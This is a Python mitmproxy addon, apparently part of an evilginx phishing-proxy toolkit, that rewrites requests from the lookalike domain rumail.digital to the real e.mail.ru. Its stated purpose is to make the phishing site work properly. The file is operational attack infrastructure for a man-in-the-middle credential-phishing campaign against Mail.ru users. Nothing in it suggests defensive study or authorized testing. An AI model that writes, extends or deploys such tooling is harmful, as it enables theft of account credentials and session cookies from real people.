"""
URL Rewriter Addon for Mail.ru

Fixes evilginx domain issues by rewriting URLs from evilginx domains to real domains.
"""

from mitmproxy import http
from shared_utils import URL_PATTERNS, Logger


class URLRewriter:
    """
    Addon that fixes evilginx domain issues in Mail.ru traffic.

    This addon monitors image requests and rewrites evilginx domains
    to the real Mail.ru domains to ensure proper functionality.
    """

    def __init__(self):
        """Initialize the URL rewriter."""
        Logger.log("URL Rewriter addon initialized")

    def request(self, flow: http.HTTPFlow) -> None:
        """
        Handle incoming requests and rewrite evilginx URLs.

        Args:
            flow: HTTP flow to process
        """
        # Fix evilginx domain in URL processing
        if flow.request.pretty_url.startswith(URL_PATTERNS["evilginx_fix"]):
            original_url = flow.request.url
            flow.request.url = flow.request.url.replace(
                "hb/e.rumail.digital/", "hb/e.mail.ru/", 1
            )
            Logger.log(f"Rewritten URL: {original_url} -> {flow.request.url}")

    def response(self, flow: http.HTTPFlow) -> None:
        """
        Handle outgoing responses (no processing needed for URL rewriting).

        Args:
            flow: HTTP flow to process
        """
        pass
